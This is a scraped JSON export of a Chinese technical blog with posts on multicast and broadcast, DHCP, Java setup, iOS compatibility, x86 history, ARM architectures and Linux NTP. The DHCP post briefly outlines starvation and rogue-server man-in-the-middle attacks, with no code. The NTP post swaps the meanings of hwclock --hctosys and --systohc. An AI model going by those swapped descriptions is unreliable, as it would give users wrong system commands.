如果采用多播，一个发送者可同时给多个接收者传输相同的数据，且只需一份的相同数据包。这样做提高了数据传送效率。减少了网络出现拥塞的可能性。 多播是介之于单播和广播之间的一种传输方式。多播的目的地址是一组主机，称之为“多播组（Multicast Group）”。 （1）多播的地址：多播地址的范围从 224.0.0.0到239.255.255.255。 （2）多播的优缺点：优点： 需要相同数据流的客户端加入相同的组共享一条数据流，节省了服务端的负载 由于组播协议是根据接受者的需要对数据流进行复制转发，所以服务端的服务总带宽不受客户端带宽的限制。IP协议允许有2亿6千多万个（268435456）组播，所以其提供的服务可以非常丰富 此协议和单播协议一样允许在Internet宽带网上传输 缺点： 与单播协议相比没有纠错机制，发生丢包错包后难以弥补，但可以通过一定的容错机制和QOS加以弥补。 例子：“多播”可以理解为一个人向指定的多个人（但不是在场的所有人）说话。 单播： 如果你要通知特定的某些人同一件事情，但是又不想让其他人知道，使用电话一个一个地通知（对应“单播”）是一种方法，但是显然非常麻烦。 广播： 使用日常生活的大喇叭进行广播通知，就达不到只通知指定的多个人的目的了 多播： ** 此时使用“多播”来实现就会非常方便快捷。** 比如，网上视频会议、网上视频点播都比较适合采用多播方式。 3.广播（Broadcast） 广播（Broadcast）是指信息在计算机网络中传输时，目的地址为网络中所有设备的一种传播方式。实际上，这里所说的“所有设备”也是限定在一个范围之中，称为“广播域”。 有线电视网的视频信号传输就是典型的广播型传输。我们的电视机实际上是一直接收到所有频道的信号，但只将一个频道的信号还原成画面。 （1）广播地址：以太网和IPv4网都用全1的地址表示广播，分别是ff : ff : ff : ff : ff : ff和255.255.255.255。 （2）多播的优缺点：优点： 网络设备简单，维护简单，布网成本低廉 由于服务端不用向每个客户端单独发送数据，所以服务端流量负载极低 缺点： 无法针对每个客户端的要求和时间及时提供个性化服务 客户端带宽成为瓶颈。服务总带宽＝客户端的最大带宽。例如有线电视的客户端的线路最多支持100个频道，即使服务商有更大的财力来配置更多的发送设备，也无法增加客户端线路支持的个数（因为此时客户端带宽成为瓶颈） 广播禁止允许在Internet网上传输 （3）应用：“广播”在网络中的应用较多，如节点通过DHCP自动获得IP地址的过程就是通过广播来实现的。但是同单播和多播相比，广播几乎占用了子网内网络的所有带宽。拿开会打一个比方吧，在会场上只能有一个人发言，想象一下如果所有的人同时都用麦克风发言，那会场上就会乱成一锅粥。 （4）广播风暴： 在网络中不能长时间出现大量的广播包，否则就会出现所谓的“广播风暴”。广播风暴就是网络长时间被大量的广播数据包所占用，正常的单播通信无法正常进行，外在表现为网络速度奇慢无比。出现广播风暴的原因有很多，一块有故障的网卡，就可能长时间向网络上发送广播包而导致广播风暴。 集线器由于其工作原理决定了不可能过滤广播风暴 一般的交换机也没有过滤广播风暴功能，不过现在有的网络交换机（如全向的QS系列交换机）也有过滤广播风暴功能了 路由器本身就有隔离广播风暴的作用 广播风暴不能完全杜绝，但是只能在同一子网内传播，就好像喇叭的声音只能在同一会场内传播一样，因此在由几百台甚至上千台电脑构成的大中型局域网中，一般进行子网划分，就像将一个大厅用墙壁隔离成许多小厅一样，以达到隔离广播风暴的目的。 参考 单播、多播（主播）、广播简介 WikiPedia-IP multicast WikiPedia-Steve Deering 单播、多播（组播）和广播的区别","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Network】DHCP 介绍与工作原理","date":"2017-06-04T02:02:32.000Z","path":"2017/06/04/【Network】DHCP介绍与工作原理/","text":"1 需求背景逐一为每一台主机设置IP地址会非常繁琐的事情。特别是在移动使用笔记本电脑、智能终端以及平板电脑等设备时，每重新接入一个新的网络，都要重新设置IP地址。 于是，为了实现自动设置IP地址、统一管理IP地址分配，就产生了 DHCP （Dynamic Host Configuration Protocol）。有了 DHCP，计算机只要连接到网络， 就可以直接进行TCP/IP通信（而无需进行手动配置）。 2 工作原理使用DHCP之前，首先要架设一台 DHCP Server。然后将可分配的 IP 地址段、相应的子网掩码、路由控制信息以及 DNS 服务器地址设置到该服务器上。 注：在普通的家庭网络中，路由器也常常充当 DHCP Server 的角色。 （1）DHCP Server分配IP的方式 DHCP Server在特定的IP地址池中自动选出一个未被使用的 IP 进行分配 DHCP Server存储一个 MAC-IP 映射表，针对MAC地址来分配固定的 IP 地址（如果这个指定的MAC地址对应的主机未连接网络，则该MAC对应的IP地址不会被使用） 注：以上两种方式对不同 DHCP Client可并存 （2）DHCP工作协议DHCP是一个典型的Client/Server模型的协议，使用UDP传输。 DHCP Server端，使用UDP端口：67DHCP Server可以在很多设备上部署（如Cisco、H3C、Juniper、Windows、Linux……） DHCP Client端，使用UDP端口：68主机、路由器、交换机、网络打印机、网络摄像头……都可以作为DHCP Client （3）DHCP的IP有效性验证使用 DHCP 时，若 DHCP Server 发生故障，将出现无法自动分配IP地址的情况， 这使得网段内所有主机之间无法进行TCP/IP通信。为了避免此问题，通常会架设两台或两台以上的 DHCP Server。 不过，当使用多个 DHCP Server 时，由于每个服务器内部都只是记录着各自分配的IP地址信息，因此可能会导致不同 DHCP Server 分配的 IP 地址相互冲突的情况。 为了检査所要分配的IP地址以及已经分配的IP地址是否可用，DHCP Server或DHCP Client必须具备以下功能： DHCP Server ：在分配某个IP地址前，需要发送 ICMP 请求包（以确认当前所分配的IP地址未被使用），确认没有应答返回后，才进行分配。 DHCP Client：在从 DHCP Server 那里获得IP地址后，发送 ARP 请求包，确认没有应答返回后，才进行使用。 3 DHCP分配过程分析DHCP的数据交互过程： 接下来详细分析各个交互过程： （1）DHCP Client发出 DHCP Discover包DHCP Client广播（域内所有主机都可以收到这个包）发出DHCP Discover包，以寻找能够给 Client 提供 IP 地址的 DHCP Server 。 备注： 这里 DHCP Client 发送了3次 DHCP Discover 包（因为 DHCP Server 响应比较慢，Client重发了 DHCP Discover 包） 这里 IP 包的源地址为0.0.0.0（因为此时还未获取到有效的IP地址） 这里 IP 包的目的地址为255.255.255.255，因此网段内的所有主机都可以收到这个包 （2）DHCP Server 发出DHCP Offer包网段内的 DHCP Server 在收到 DHCP Client 发出的DHCP Discover包后，均会发出DHCP Offer包（以给予 DHCP Client 进行响应）。 整理一下IP信息： DHCP Server IP：10.138.10.90 待分配给该 DHCP Client 的IP：10.138.11.122 DNS：202.96.209.133 、 202.96.209.6 路由器：10.138.10.1 备注： 因为DHCP Discover包是广播发出的（ IP 包的目的地址为255.255.255.255），网段内的所有主机都可以收到这个包，因此所有可达的 DHCP Server 也都会收到这个数据包，而所有收到该包的 DHCP Server 都会发出DHCP Offer包。 上面这条规则意味着：若网段内存在3台可用的 DHCP Server ，且3台 Server均收到了 Client 发出的DHCP Discover，那么这3台 Server 均会发出DHCP Offer包 若 DHCP Client 收到多个DHCP Offer包，通常取最先收到的那个 DHCP Offer包中包含待分配给 DHCP Client 的 IP（Your (client) IP Address字段）、该 DHCP Server 的 IP（Next server IP address字段） 除了上面两个IP信息外，DHCP Offer包中还包括子网掩码（Option: (1) Subnet Mask字段）、IP有效时间长度（Option: (51) IP Address Lease Time字段）、DHCP Server IP（Option: (54) DHCP Server Identifier字段）、路由器IP（Option: (3) Router字段）、DNSServerIP（Option: (6) Domain Name Server字段）等。 DHCP Server 选择待分配IP优先级： DHCP Server 从 IP 地址池中选择待分配 IP 地址时，以如下优先级进行选择： 当前已经存在的IP- MAC 的对应关系 该 DHCP Client 以前的 IP 地址 读取Discovery报文中的Requested Ip Address Option的值，如果存在并且 IP 地址可用 （3）DHCP Client 发出DHCP Request包DHCP Client 在收到 DHCP Server 发出DHCP Offer包后，遍发出DHCP Request包。 备注： 这里 IP 包的目的地址为255.255.255.255，因此网段内的所有主机都可以收到这个包 DHCP Request包的Option字段中会记录Client选中的待分配IP地址和对应的DHCP Server （4）DHCP Server 发出DHCP ACK包 DHCP Server 收到 DHCP Client 发出DHCP ACK包后，会校验包里记录的DHCP服务器IP与本机 IP 是否一致。如果一致，DHCP Server 会发出DHCP ACK包，以最终对 DHCP Client 发出的DHCP Request包进行响应。 （5）DHCP Client 收到DHCP ACK包DHCP Client 在收到DHCP ACK包后，会通过发出ARP包来检查该分配的IP地址是否能够使用。 如果能够使用，Client 在此后发出的数据中，均包含该分配的IP地址 如果 Client 发现此分配IP依据被使用，则会发出DHCP Decline包（以通知 DHCP Server 禁用这个IP），并向 Server 申请新的可用IP （6）Client使用IP租期问题a.在使用租期超过总租期的50%时在使用租期超过总租期的50%时，DHCP Client 会以单播形式向 DHCP Server 发送DHCP Request包来续租IP地址。如果 Client 成功收到 Server发送的DHCP ACK包，则按相应时间延长IP地址租期；如果没有收到 Server 发送的DHCP ACK包，则 Client 继续使用这个IP地址。 b.在使用租期超过总租期的85%时在使用租期超过总租期的85%时，DHCP Client会以广播形式向DHCP Server发送DHCP Request报文来续租IP地址。 如果 Client 成功收到 Server 发送的DHCP ACK包，则按相应时间延长IP地址租期； 如果没有收到 Server 发送的DHCP ACK包，则 Client 继续使用这个IP地址。直到IP地址使用租期到期时， Client 才会向 Server 发送DHCP Release包来释放这个IP地址，并开始申请新的IP地址。 （7）DHCP Client 发出DHCP Release包当 Client 不再使用这个IP时，会发出DHCP Release包，以告知 DHCP Server 回收相应IP并重新分配。 4 小技巧（1）在Wireshark中过滤DHCP包添加bootp过滤条件。 （2）手动模拟重连接网络与断开网络a 重连接网络作用：更新适配器信息，请求连接网络，（这条命令结束之后，主机会获得一个可用的IP，再次接入网络） 1ipconfig /renew 输入命令后，在Wireshark中，截获四个DHCP包： b 断开网络作用：断开当前的网络连接（主机IP变为0.0.0.0，主机与网络断开，不能访问网络） 1ipconfig /release 输入命令后，在Wireshark中，截获一个DHCP Release包： 5 DHCP AttackDHCP starvation attack（DHCP饥饿攻击）。通过伪造大量不同的MAC地址，并大量发出DHCP Request来申请新的IP，使 DHCP Server 的可用IP被耗尽，使得网络中的合法主机无法正常获取到IP，最终无法正常使用网络。 其实，这种攻击手法与TCP SYN Flooding Attack（SYN泛洪攻击）是比较类似的。 更进一步地，攻击者再伪造一台DHCP Server ，提供给合法用户分配IP的服务，且将默认网关、DNS都设置成自己的服务器，进而对合法用户进行中间人攻击（DNS欺骗）。 参考 Dynamic Host Configuration Protocol 《图解HTTP》 详解DHCP工作方法，并用wireshark对DHCP四个数据包抓包分析 DHCP的基本实现原理","comments":true,"categories":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/categories/Network/"}],"tags":[{"name":"Network","slug":"Network","permalink":"http://swsmile.info/tags/Network/"}]},{"title":"【Java】Java 开发环境配置及踩的坑","date":"2017-06-04T01:35:53.000Z","path":"2017/06/04/【Java】Java开发环境配置及踩的坑/","text":"背景看到这个标题，你可能会觉得这么简单的环境配置似乎不值得写一篇文章。然而，我曾因几次没完整且正确的配置Java环境，而踩了一些小坑。 顺便也借这篇文章，梳理一下配置Java环境过程中一些设置的知识点。 JDK与JREJREJava Runtime Environment（JRE）是运行JAVA程序所必须的环境的集合，包括Java虚拟机（JVM）标准实现及Java核心类库，但是不包括 Java 开发工具（编译器、调试器等）。 简单来说，JRE安装后，就可以执行Java程序了。 JDKJava Development Kit（JDK），即 Java 语言的软件开发工具包。包括了Java的运行环境，Java开发工具和Java基础类库。 我们要开发Java程序，必须要安装JDK。JDK中包含了JRE，换句话说，当JDK安装完成时，JRE同时也被安装好了。 在JDK中，又分为3种版本。 JDK版本： SE（J2SE），即 standard edition，标准版，是我们通常用的一个版本 EE（J2EE），即 Enterprise Edition，企业版，其在J2SE的基础之上进行扩展，使用这种JDK开发J2EE应用程序 ME（J2ME），即 Micro Edition，其主要用于开发移动设备、嵌入式设备上的java应用程序 注意，他们三者并不是没有交集的，J2EE 和 J2ME 都是在 J2SE 之上的扩展（增加一些类库和开发工具）。 JVMJVM 即 Java Virtual Machine（Java虚拟机）。 Java 语言的一个非常重要的特点就是与平台的无关性。而使用 JVM 是实现这一特点的关键。 一般的高级语言如果要在不同的平台上运行，至少需要编译成不同的目标代码。而引入 JVM 后，Java程序在不同平台上运行时不需要重新编译。Java语言使用 JVM 屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在 JVM 上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。JVM 在执行字节码时，把字节码解释成具体平台上的机器指令执行。 这就是 Java 能够“一次编译，到处运行”的原因。 三者关系 JDK下载进入 Oracle 官网（http://www.oracle.com/technetwork/java/javase/downloads/index.html ），根据运行的操作系统平台，选择匹配的JDK下载。 这里，我选择了 J2SE 的Windows x64版本： JDK安装1 exe执行运行下载完成的jdk-8u131-windows-x64.exe 根据实际情况修改路径： 安装完成后，继续配置环境变量。 2 配置环境变量右键计算机，依次点击属性-高级系统设置-高级-环境变量，在系统变量中点击新建 新建，变量名JAVA_HOME，变量值C:\\Program Files\\Java\\jdk1.8.0_131（即JDK的安装路径，具体以本机上JDK安装路径为准） 编辑，变量名Path，在原变量值后加上;%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin 新建，变量名CLASSPATH，变量值.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar 3 验证开发环境控制台（Terminal）中输入java -version。 若与下类似显示出当前版本信息，则说明已经正确配置了环境变量Path。 这里需要特别说明的是，在控制台（Terminal）中输入java -version后显示版本信息，只能说明已经正确配置了环境变量Path，但不能说明是否正确配置了环境变量ClassPath。 事实上，网上搜到的有的Java开发环境配置教程中，并不会让我们配置环境变量ClassPath，这样的配置步骤缺失，会带来新的麻烦。 在控制台下验证第一个java程序存储于C:\\Test.java： 12345public class Test &#123; public static void main(String[] args) &#123; System.out.println(&quot;Hello Java&quot;); &#125;&#125; 在控制台中执行javac Test.java（编译Java程序），java Test（执行Java程序）。 参考 wikipedia - Java_Development_Kit JDK、JRE、JVM三者间的关系","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【iOS】 iOS不同操作系统兼容问题","date":"2017-05-15T14:25:02.000Z","path":"2017/05/15/【iOS】iOS不同操作系统适配问题/","text":"1.背景 每隔一段时间，iOS都会更新最新的操作系统版本。因此对于App开发者，需要考虑不同iOS系统版本兼容的问题。 从Apple的官网上，我们可以获取到不同iOS操作系统版本的分布。 地址：https://developer.apple.com/support/app-store/ 但是，由于官方对于数据的更新频率较慢，因此我们也可以参考以下数据： https://data.apteligent.com/ios/ https://bugfender.com/stats 虽然iOS版本碎片化问题比Andorid要好太多太多，然而客观上仍然存在一定的碎片化问题。 2.Xcode配置在Xcode中，与iOS操作系统版本相关的主要包括Base SDK和Deployment Target两个设置。 （1）Base SDKBase SDK是指用来编译我们项目（App or 类库）的SDK（Software Development Kit）版本，每一个iOS操作系统版本都会对应一个SDK版本号。 这个SDK包含了开发者要用到的所有头文件、链接库的集合。如果Apple推出了新的API，也会增加在这个SDK里。 默认情况下，Xcode中创建的新工程总是使用当前已下载的最新的SDK（这样能保证你能够使用到Apple最新的API），而苹果会处理废弃的API。除非你有充分的理由，否则你应该使用这个默认的SDK版本。 （2）Deployment TargetDeployment Target是指编译出的程序最低可以在哪个版本的操作系统上运行。 比如我设置成iOS 10.2，那么编译出的App or 类库，最低可以在iOS 10.2的平台上运行（前提是未使用高于10.2的API）。如果这个App发布到了AppStore，那么若低于 10.2版本的设备下载或安装这个App，会被自动阻止。 事实上，如果手动将这个值设置成iOS 8.0以下的话，Xcode 会发出警告（印象中是从 Xcode 8开始出现这个警告的），建议将Deployment Target设置为iOS 8.0。 结合【1.背景】中提到的iOS 操作系统版本分布统计，iOS 8.0以下的占有量其实也是非常非常低的。 截止2017.5.1，除了个别用户量非常非常大的App（微信设置为7.0，支付宝设置为7.0），大部分App都至少将其设置为8.0（甚至更高）。 （3）Deployment Target与Base SDK关系 这里用一张图说明了deployment target设置为OS X v10.4， base SDK 设置为OS X v10.6时的情况。这时，应用可以无条件使用兼容10.0到10.4的API，有条件使用兼容10.5到10.6的API（必要时进行运行时判断）。 让我们更深入的剖析这张图： 特性： Deployment target决定了你可以无条件使用的所有函数和系统调用的范围 Base SDK决定了你可以挑选的一些最新的功能 or API 的范围 因此： 如果你在App中使用连Base SDK都不支持的函数，那会产生一个编译错误 如果你使用了在文档中被标明了在Base SDK对应操作系统下中是 deprecated 的函数，那会产生一个编译警告 如果你使用了Base SDK里的可选函数（），然后编译出App。可是安装到低SDK版本的iPhone上，该函数只是一个空指针。 最终，我们得出两者的关系：Base SDK 的版本大于等于 Deployment Target 的版本。这里仍然要提醒一点：只要用到的类、方法在当前Base SDK版本里存在，就可以编译通过。但是编译通过并不意味着就一定能执行成功。 因为，如果运行这个App设备对应的系统版本低于这些类 or 方法的最低版本要求，App可能就会Crash。这也解释了有条件使用兼容10.5到10.6的API（必要时进行运行时判断）的含义。即，在使用某些兼容范围没这么广的API时，需要做相应判断，在条件允许的情况下，才可以使用。 当然啦，说得容易，实践起来还是略微困难的。因此，有一个排查Bug的tip： 如我们采用了第三方库来监测线上App崩溃的情况，如果某个崩溃只在某个崩溃只在特定操作系统上发生，那么问题很有可能有API兼容性有关。 之所以会存在【有条件使用某些API】这个需求，是因为Apple官方会不定时废弃一些API。 已废弃(Deprecated)的API指的是那些已经过时且在将来某个时间点会被移除的方法或类。 通常，Apple在引入一个更优秀的API后，就会把原来的API废弃掉。新引入的API通常意味着可以更好的发挥新硬件或操作系统的性能，或者使用了一些在构建原有API时根本还没有的语言特性。 3.各种问题（1）注意依赖库的Deployment Target我们所依赖的库的Deployment Target不应该高于应用的Deployment Target，否则可能发生难以排查的错误。 从第三方库开发者的角度来说，应该明确指出该库的Deployment Target设置。并在条件允许的情况下，将Deployment Target尽可能设置低一些，以增加适用性。 （2）运行操作系统判断如果存在在特定操作系统上使用特定API的需求，我们可以借助系统预定义的宏，也可以在运行时判断当前系统版本。 a.使用宏宏定义只在编译时起作用。换句话说，被宏包起来的代码是否被执行，在编译的时候就确定了。 123#if __IPHONE_OS_VERSION_MIN_REQUIRED &gt;= 70000 NSLog(@&quot;swsmile&quot;);#endif 用到的宏： __IPHONE_OS_VERSION_MAX_ALLOWED: 值等于Base SDK __IPHONE_OS_VERSION_MIN_REQUIRED: 值等于Deployment Target b.运行时判断当前系统版本与宏只在编译时起作用的特性不同，我们还可以在运行时判断当前系统版本： 1234# 判断当前系统版本是否大于8.0if ([UIDevice currentDevice].systemVersion.floatValue &gt; 8.0f) &#123; // ...&#125; 参考 App Distribution Guide SDK and Deployment Target Configuring a Project for SDK-Based Development iOS开发之多系统版本兼容 SDK Compatibility Guide Everything You Need to Know about iOS and OS X Deprecated APIs 解决多版本SDk的兼容问题","comments":true,"categories":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/categories/iOS/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/tags/iOS/"}]},{"title":"【Hardware】i386、x86和x64的故事","date":"2017-04-30T15:16:56.000Z","path":"2017/04/30/【Hardware】i386、x86和x64的故事/","text":"1.i386 和 x86的故事（1）x86的由来x86架构首度出现在1978年推出的Intel 8086中央处理器，它是从Intel 8008处理器中发展而来的，而8008则是发展自Intel 4004的。在8086之后，Intel又推出了包括80186、80286、80386以及80486。 在设计上，这些后续的处理器使用的指令集都是在8086的基础上添加新支持的指令进行改进的，因此可以说都是向下兼容（backward compatibility）的，即能在8086上运行的程序在80486上也一定能运行。 向下兼容（Downward Compatibility），又称作向后兼容（Backward Compatibility），指在一个程序或者类库更新到较新的版本后，用旧的版本程序创建的文档或系统仍能被正常操作或使用，或在旧版本的类库的基础上开发的程序仍能正常编译运行的情况。例如较高档的计算机或较高版本的软件平台可以运行较为低档计算机或早期的软件平台所开发的程序 由于都是以86结尾（不过8088也是x86），所以把这一系列的指令集，称之为x86指令集（架构）。准确的来讲，x86这一术语并不是指的某一个（具体CPU使用的）具体的指令集，而是在8086（的指令集）基础上发展而来的所有指令集的泛称。 x86与CPU的位数无关，包括16位、32位、64位的CPU。 实际上，在80486以后Intel推出的绝大多数CPU都是x86的，包括Pentium 、Pentium Pro 、Pentium MMX ，Pentium 2 ，还有后面的Pentium 3、Pentium 4 、Pentium D 、Core 全系列，（x86系列的） Xeon。另外，使用x86架构的处理器制造商远非Intel一家，最著名的就是AMD，其他的还有VIA、Cyrix。 （2）x86-32（x86、i386、IA-32）从1985年80386开始，intel通过对x86架构进行32位的扩展，实现了32位CPU，而之前的都是16位。Intel把支持32位的 x86指令集架构命名为ia-32(Intel Architecture 32bit)。实际上由于32位x86处理器的统治性，术语“x86”几乎等于IA-32，即32位的x86或x86-32，例如 Windows 和 Linux发行版的32位版本命名都是x86（而不是x86-32或IA-32）。后来的“x86-64”名称也继续强化了这种约定方式。 这里还是要强调， x86是一系列架构的泛称，支持16位、32位和64位的指令都有。 （3）x86-64（x64、AMD64）该来的还是会来，在1999年，AMD宣布了x86-64架构。其实现方式与之前的80386思路一致，继续对IA-32扩展，增加64位通用寄存器、证书预算单元和逻辑操作，支持64位虚地址，向前兼容ia-32。 2003年第一款x86-64处理器发布，AMD Operon。同时AMD也将x86-64正式命名为AMD64。这下Intel彻底2B了，以前都是AMD小弟追随者Intel大哥的脚步，如今AMD先实现了64位民用桌面级CPU。 其实Intel也有其64位计划，在2004年的IDF上，Intel承认其64 位计划，命名为ia-32e，即ia-32 extension，之后又改成EM64T，Extended Memory 64 Technology，最终命名为Intel64。 实际上EM64T与AMD64几乎相同。早期EM64T不兼容AMD64的少量指令，但是由于AMD在64位技术中的领先地位，Intel2005年不得不宣布将完全兼容AMD64。 所以现在装的64位版本操作系统从没有说是面向Intel还是AMD的。不过在称谓上，大多数厂商还是使用x86-64（x86_64、x64，或者AMD64）来称呼此架构，从而保持中立。 2.关于32和64的说明（1）操作系统 32位的操作系统：32位的操作系统可以运行在32位 or 64位的CPU上。 64位的操作系统：只有64位的 CPU 才能运行64位的操作系统，当然现在市面上几乎所有消费级CPU都已经是64位的了。 32位的操作系统只能支持最大4GB的内存。这意味着，如果你安装多于4GB的内存条，那么超过4GB的那部分并不会被操作系统所使用。 （2）应用程序 32位的应用程序：32位的应用程序可以运行在32位 or 64位的操作系统上。 64位的应用程序：64位的应用程序只能运行在64位的操作系统上。 3.参考 Wikipedia - x86 Wikipedia - x64 What are the differences between 32-bit and 64-bit, and which should I choose? i386 different from x86? [closed] i386 和 x86-64 有什么区别？ x86, i386, x86-64, x64, and amd64? Oh My! 32bit_and_64bit","comments":true,"categories":[{"name":"Hardware","slug":"Hardware","permalink":"http://swsmile.info/categories/Hardware/"}],"tags":[{"name":"Hardware","slug":"Hardware","permalink":"http://swsmile.info/tags/Hardware/"}]},{"title":"【iOS】 Apple移动设备处理器指令集与Xcode指令集相关设置","date":"2017-04-30T14:01:15.000Z","path":"2017/04/30/【iOS】Apple移动设备处理器指令集与XCode指令集相关设置/","text":"1.ARMARM处理器，因为其低功耗和小尺寸而闻名，几乎所有的手机处理器都基于ARM，其在嵌入式系统中的应用非常广泛，它的性能在同等功耗产品中也很出色。 ARMv6、ARMv7、ARMv7s、ARM64都是ARM处理器的指令集，所有指令集原则上都是向下兼容的。 如 iPhone4S 的CPU默认指令集为ARMv7指令集，但iPhone4S 的 CPU 同时也兼容ARMv6指令集（也就是，只包含 ARMv6 指令集的.ipa同样也可以运行在 iPhone4S 上）。只是使用 ARMv6 指令集运行时无法充分发挥其性能，即无法使用ARMv7指令集中的新特性。同理，iPhone5的处理器标配 ARMv7s 指令集，同时也支持 ARMv7 指令集，只是无法进行相关的性能优化，从而导致程序的执行效率没那么高。 需要注意的是iOS模拟器没有运行ARM指令集，编译运行的是x86指令集，所以，只有在iOS设备上，才会执行设备对应的ARM指令集。 2.设备默认指令集 从 iPhone 6之后出的iPhone、iPad、iPod touch均为arm64架构。 3.Xcode中与指令集相关的选项【Xcode】 - 【Build Setting】中指令集相关设置： 常用的架构项： armv7 armv7s arm64 i386 x86_64 从Xcode4.5开始，就不再支持armv6指令集，所以列表中写了也是白写。 （1）Architectures官方文档描述： Space-separated list of identifiers. Specifies the architectures (ABIs, processor models) to which the binary is targeted. When this build setting specifies more than one architecture, the generated binary may contain object code for each of the specified architectures. Architectures指定工程编译出的二进制包支持哪些指令集类型。 如果选择多个指令集，就会编译出包含多个指令集代码的数据包，对应生成二进制包就越大。 （2）Valid Architectures官方文档描述： Space-separated list of identifiers. Specifies the architectures for which the binary may be built. During the build, this list is intersected with the value of ARCHS build setting; the resulting list specifies the architectures the binary can run on. If the resulting architecture list is empty, the target generates no binary. Valid Architectures指定哪些指令集允许被支持，其实这个设置主要处理的是指令集向下兼容问题。 而最后编译出包含哪些指令集的包，将由Architectures与Valid Architectures 设置项的交集来确定。 比如，将Architectures支持arm指令集设置为：armv7，armv7s，对应的Valid Architectures的支持的指令集设置为：armv7s、arm64，那么此时，Xcode生成二进制包所支持的指令集只有 armv7s 。 （3）Build Active Architecture Only官方文档描述： Boolean value. Specifies whether the product includes only object code for the native architecture. Build Active Architecture Only指定是否只对当前连接设备所使用的指令集编译。 当设置为 yes 时，它只编译当前连接设备对应的architecture版本（编译速度较快）；而当设置为 no 时，会编译对应所有architecture的版本。 所以，一般debug模式下可设置为yes，release模式下设置为no。 （4）各种小问题a.向下兼容问题** ARMv6｜ARMv7｜ARMv7s｜ARM64都是ARM处理器的指令集（指令集版本由高到低（ARM64 &gt; ARMv7s &gt; ARMv7 &gt; ARMv6）），这些指令集都是向下兼容的。** 这里的向下兼容是指：包含高指令集的 .ipa可以运行在只支持低版本指令集的Apple设备上。 比如编译出来的二进制包只包括 ARMv7 指令集，在iPhone5（ARMv7s）中是可以运行，但是在iPhone 1（ARMv6）上就不能运行了。 b.【.a】文件支持的架构类型问题平时项目开发中，可能使用第三方提供的静态库.a，如果.a提供方技术不成熟，使用的时候就会出现问题，例如： 在真机上编译报错：No architectures to compile for (ONLY_ACTIVE_ARCH=YES, active arch=x86_64, VALID_ARCHS=i386). 在模拟器上编译报错：No architectures to compile for (ONLY_ACTIVE_ARCH=YES, active arch=armv7s, VALID_ARCHS=armv7 armv6). 原因其实是，我的项目被设置为最终编译时包含某种指令集对应的二进制代码，然而这个第三方.a库中并没有包含这种特定的指令集。 （5）总结说了这么多，或许你不想了解这么多细节，只希望知道【最佳实践的设置】，结论如下： （1）对于普通 App 开发者，Architectures、Valid Architectures、Build Active Architecture Only的设置按项目初始时的默认设置即可，不要修改他们。默认值如下： （2）对于第三方库的开发者，需要保证在.a or .framework中包含 ARMv7、ARMv7s、ARM64 3种指令集对应的二进制代码。 4.参考 Apple移动设备处理器指令集 armv6、armv7、armv7s及arm64 i386 和 x86-64 有什么区别？ armv7 &amp; armv7s &amp; arm64 &amp; i386 &amp; x86_64 iOS Devices: Releases, Firmware, Instruction Sets, Screen Sizes 对arm指令集的疑惑，静态库运行，编译报错等问题 What’s the difference between “Architectures” and “Valid Architectures” in Xcode Build Settings? Application unavailable for download on older devices","comments":true,"categories":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/categories/iOS/"}],"tags":[{"name":"iOS","slug":"iOS","permalink":"http://swsmile.info/tags/iOS/"}]},{"title":"【Linux】时间同步问题与Linux NTP","date":"2017-04-25T14:35:06.000Z","path":"2017/04/25/【Linux】时间同步问题与Linux-NTP/","text":"零.相关知识1.时间与时区如果有人问你说现在几点? *你看了看表回答他说晚上8点了。这样回答看上去没有什么问题，但是如果问你的这个人在欧洲的话那么你的回答就会让他很疑惑，因为他那里还太阳当空呢。*这里就有产生了一个如何定义时间的问题。为在地球环绕太阳旋转的24个小时中，世界各地日出日落的时间是不一样的.所以我们才有划分时区(timezone) 的必要，也就是把全球划分成24个不同的时区。所以我们可以把时间的定义理解为一个时间的值加上所在地的时区(注意这个所在地可以精确到城市)。 那么假如现在中国当地的时间是晚上8点的话。我们可以有下面两种表示方式： 20:00 CST 12:00 UTC 这里的 CST 是Chinese Standard Time，即北京时间。UTC 是Coordinated Universal Time，即协调世界时。 因为中国处在UTC+8时区，依次类推那么也就是12:00 UTC了。 2.硬件时间时钟 与 系统时钟在我们的计算机上，存在两个时钟：硬件时间时钟(RTC)，和系统时钟(System Clock)。 硬件时钟是指嵌在主板上的特殊的电路, 它的存在就是平时我们关机之后还可以计算时间的原因。 系统时钟就是操作系统内核计算时间的时钟. 它从1970年1月1日00:00:00 UTC时间到目前为止秒数总和的。 在Linux下，系统时间在开机的时候会和硬件时间同步(synchronization)。然而在这次同步之后，这两个时钟也就各自独立运行了（硬件时间依靠BIOS电池来维持，而系统时间依靠CPU tick来维持）。 查看系统时间： 1date 修改系统时间： 1date -set &quot;2017-05-01 00:01&quot; 查看当前硬件时钟对应的时间： 1hwclock --show 我们可以看到，硬件时间和系统时间是会存在一定误差的，因此我们可以把他们同步。 将硬件时间设置成当前系统时间： 1hwclock --hctosys 将当前系统时间设置成硬件时间： 1hwclock --systohc 但是，问题在于【如果这两个时间都不准】怎么办呢？这时候就要在互联网上找一个可以提供准确时间的服务器，并通过一种协议将我们的系统时间，与服务器的时间进行同步，这就是NTP同步，这个协议就是NTP（Network Time Protocol）。 二.NTP Server搭建我们的计算机运行一定时间后就会产生时间误差，真正能够精确地测算时间的还是原子钟。但是，由于原子钟十分的昂贵，只有少部分组织拥有。他们连接到计算机之后就成了一台 NTP Server。 NTP Server是用于给其他计算机进行时间同步的服务器。 在服务器集群中，通常会搭建一台NTP Server，以向集群中的其他服务器提供时间同步服务。 事实上，这台NTP Server也会向权威NTP Server进行时间同步，通常会选择距离集群中这台NTP Server最近的权威NTP Server来进行同步。 权威ntp服务器列表：http://www.pool.ntp.org 下面我们来搭建集群中的这台NTP Server： 1.查看NTP是否已经安装1rpm -qa | grep ntp 